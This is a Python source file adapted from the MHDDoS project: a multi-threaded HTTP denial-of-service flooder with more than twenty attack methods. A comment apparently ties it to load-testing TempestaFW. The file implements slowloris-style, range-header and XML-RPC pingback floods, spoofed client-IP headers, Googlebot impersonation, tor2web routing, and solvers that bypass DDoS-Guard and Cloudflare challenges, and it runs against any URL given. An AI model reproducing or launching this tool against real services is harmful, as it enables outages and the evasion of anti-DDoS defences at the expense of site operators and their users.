#!/usr/bin/env python3
# Code based on the MHDDoS project, available at: https://github.com/MatrixTM/MHDDoS
# MIT License
import argparse
import random
from contextlib import suppress
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice
from re import compile
from socket import AF_INET, IPPROTO_TCP, SOCK_STREAM, TCP_NODELAY, socket
from ssl import CERT_NONE, SSLContext, create_default_context
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set
from urllib import parse

import urllib3
import yarl
from certifi import where
from cloudscraper import create_scraper
from PyRoxy import Tools as ProxyTools
from requests import Response, Session, cookies

basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
urllib3.disable_warnings()

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.sh",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    # attack methods used for TempestaFW
    VALID_L7_METHODS = {
        "GET",
        "POST",
        "OVH",
        "RHEX",
        "STOMP",
        "STRESS",
        "DYN",
        "DOWNLOADER",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "AVB",
        "BOT",
        "APACHE",
        "XMLRPC",
        "CFBUAM",
        "KILLER",
    }

    # TODO: attack methods using requests library and requiring improvement
    REQUESTS_L7_METHODS = {
        "DGB",
        "CFB",
        "BYPASS",
    }


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue("i", value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile('"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}"
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len("\r\n".join(f"{key}: {value}" for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url: str, ua: str, host: str) -> Session:
        idss = None
        with Session() as s:
            hdrs = {
                "Host": host,
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            with s.get(url, headers=hdrs, verify=False) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "Host": host,
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs, verify=False) as ss:
                for key, value in ss.cookies.items():
                    if key == "__ddg2":
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "Host": host,
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, verify=False) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

    @staticmethod
    def get_proxy_lists() -> list[list[str]]:
        """
        Get IPs from file.
        Format: [["192.168.1.1", ...], ["192.168.2.2", ...]]
        """
        methods_N = len(Methods.VALID_L7_METHODS)
        with open(__dir__ / "files/proxies.txt", "r") as f:
            proxies = [line.rstrip("\n") for line in f.readlines()]
        proxies_n = len(proxies)
        return [
            proxies[i : i + int(proxies_n / methods_N)]
            for i in range(0, proxies_n, int(proxies_n / methods_N))
        ]


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[str] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: yarl.URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(
        self,
        thread_id: int,
        target: yarl.URL,
        host: str,
        method: str = "GET",
        rpc: int = 1,
        synevent: Event = None,
        useragents: Set[str] = None,
        referers: Set[str] = None,
        proxies: list[str] = None,
    ) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._target.host, self._target.port)
        self._proxies = proxies

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }

        self._referers = list(referers)
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/1.1\r\n"
        self._payload = (
            self._defaultpayload + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
        )
        self._host_list = [self._host, self._target.authority]  # domain name and IP address
        self._human_target = self._target.human_repr()
        if self._target.scheme.lower() == "https":
            self.open_connection = self._open_ssl_connection
        else:
            self.open_connection = self._open_connection

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.methods.get(name, self.GET)

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f"X-Forwarded-For: {spoof}\r\n"
            f"Real-IP: {spoof}\r\n"
        )

    def _get_host(self) -> str:
        return randchoice(self._host_list)

    def generate_payload(self, other: str = "") -> bytes:
        return str.encode(
            self._payload
            + f"Host: {self._get_host()}\r\n"
            + self.randHeadercontent
            + other
            + "\r\n"
        )

    def _open_connection(self, host: tuple[str, int] = None) -> socket:
        # TODO probably we should use async socket here and does not use threads
        sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(0.9)

        try:
            sock.bind((random.choice(self._proxies), 0))
        except IndexError:
            # We must do nothing because we didn't set proxies
            pass
        sock.connect(host or self._raw_target)
        return sock

    def _open_ssl_connection(self, host: tuple[str, int] = None) -> socket:
        return ctx.wrap_socket(
            self._open_connection(host),
            server_hostname=self._host,
            server_side=False,
            do_handshake_on_connect=True,
            suppress_ragged_eofs=True,
        )

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._human_target)}\r\n"
            + self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        if method.upper() in {
            "CFB",
            "CFBUAM",
            "GET",
            "TOR",
            "COOKIE",
            "OVH",
            "EVEN",
            "DYN",
            "SLOW",
            "PPS",
            "APACHE",
            "BOT",
            "RHEX",
            "STOMP",
        }:
            return "GET"
        elif method.upper() in {"POST", "XMLRPC", "STRESS"}:
            return "POST"
        elif method.upper() in {"GSB", "HEAD"}:
            return "HEAD"
        else:
            return "PUT"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 44\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(32)
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(
            self._payload + f"Host: {target}\r\n" + self.randHeadercontent + "\r\n"
        )
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 524\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(512)
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n"
            % (
                ProxyTools.Random.rand_int(1000, 99999),
                ProxyTools.Random.rand_str(6),
                ProxyTools.Random.rand_str(32),
            )
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)) + "\r\n\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n"
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>"
            )
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )[:-2]
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def PPS(self) -> None:
        payload: Any = str.encode(self._defaultpayload + f"Host: {self._get_host()}\r\n\r\n")
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        host: str = self._get_host()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents)
            + "Accept-Encoding: gzip,deflate,br\r\n\r\n"
        ), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents)
            + "Accept-Encoding: gzip,deflate,br\r\n"
            'If-None-Match: "%s-%s"\r\n'
            % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4))
            + "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                with s.get(
                    self._human_target, headers={"Host": self._get_host()}, verify=False
                ) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120:
                    break

    def AVB(self):
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            with Tools.dgb_solver(
                self._human_target, randchoice(self._useragents), self._get_host()
            ) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(
                        self._human_target, headers={"Host": self._get_host()}, verify=False
                    ) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

    def DYN(self):
        payload: Any = str.encode(
            self._payload
            + f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
            + self.randHeadercontent
            + "\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(0.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b"0")

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                with s.get(
                    self._human_target, headers={"Host": self._get_host()}, verify=False
                ) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)

    def GSB(self):
        payload = str.encode(
            "%s %s?qs=%s HTTP/1.1\r\n"
            % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
            + f"Host: {self._get_host()}\r\n"
            + self.randHeadercontent
            + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: Keep-Alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode(
            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target, randhex)
            + "Host: %s/%s\r\n" % (self._get_host(), randhex)
            + self.randHeadercontent
            + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def STOMP(self):
        dep = (
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        hexh = (
            r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87"
            r"\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F"
            r"\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F"
            r"\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84"
            r"\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F"
            r"\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98"
            r"\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98"
            r"\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B"
            r"\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99"
            r"\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C"
            r"\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
        )
        p1, p2 = str.encode(
            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target, hexh)
            + "Host: %s/%s\r\n" % (self._get_host(), hexh)
            + self.randHeadercontent
            + dep
        ), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type, self._target)
            + "Host: %s\r\n" % hexh
            + self.randHeadercontent
            + dep
        )
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)

    def NULL(self) -> None:
        payload: Any = str.encode(
            self._payload
            + f"Host: {self._get_host()}\r\n"
            + "User-Agent: null\r\n"
            + "Referrer: null\r\n"
            + self.SpoofIP
            + "\r\n"
        )
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def SLOW(self):
        payload: bytes = self.generate_payload()
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break


if __name__ == "__main__":
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            parser = argparse.ArgumentParser(description="ddos tools")
            parser.add_argument("--url", type=str, default="http://localhost")
            parser.add_argument("--threads", type=int, default=1, help="total number of threads")
            parser.add_argument("--rpc", type=int, default=1, help="requests per connection")
            parser.add_argument("--duration", type=int, default=1)
            parser.add_argument(
                "--hostname", type=str, default="localhost", help="Host header and ssl hostname."
            )
            arguments = parser.parse_args()

            URL = yarl.URL(arguments.url)
            HOST = arguments.hostname
            THREADS = arguments.threads
            RPC = arguments.rpc
            DURATION = arguments.duration
            try:
                UAGENTS = set(
                    a.strip() for a in Path(__dir__ / "files/useragent.txt").open("r+").readlines()
                )
                REFERERS = set(
                    a.strip() for a in Path(__dir__ / "files/referers.txt").open("r+").readlines()
                )
            except FileNotFoundError as e:
                exit(f"The {e.filename} file doesn't exist ")

            if not UAGENTS or not REFERERS:
                exit("Empty Referer or Useragent file ")

            if THREADS * len(Methods.VALID_L7_METHODS) > 256:
                logger.warning("Thread is higher than 256")

            proxies = Tools.get_proxy_lists()

            EVENT = Event()
            EVENT.clear()

            for i, method in enumerate(Methods.VALID_L7_METHODS):
                for thread_id in range(THREADS):
                    HttpFlood(
                        thread_id,
                        URL,
                        host=HOST,
                        method=method,
                        rpc=RPC,
                        synevent=EVENT,
                        useragents=UAGENTS,
                        referers=REFERERS,
                        proxies=proxies[i],
                    ).start()
            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} "
                f"{HOST}{bcolors.WARNING} with{bcolors.OKBLUE} "
                f"{len(Methods.VALID_L7_METHODS)}{bcolors.WARNING} "
                f"methods for{bcolors.OKBLUE} {DURATION}{bcolors.WARNING} seconds, "
                f"threads:{bcolors.OKBLUE} {THREADS}{bcolors.WARNING}!{bcolors.RESET}"
            )
            EVENT.set()
            ts = time()
            while time() < ts + DURATION:
                logger.debug(
                    f"{bcolors.WARNING}Target:{bcolors.OKBLUE} {HOST},{bcolors.WARNING} "
                    f"Port:{bcolors.OKBLUE} {URL.port},{bcolors.WARNING} "
                    f"PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))},{bcolors.WARNING}"
                    f" BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))} / "
                    f"{round((time() - ts) / DURATION * 100, 2)}{bcolors.RESET}"
                )
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            EVENT.clear()
            exit()
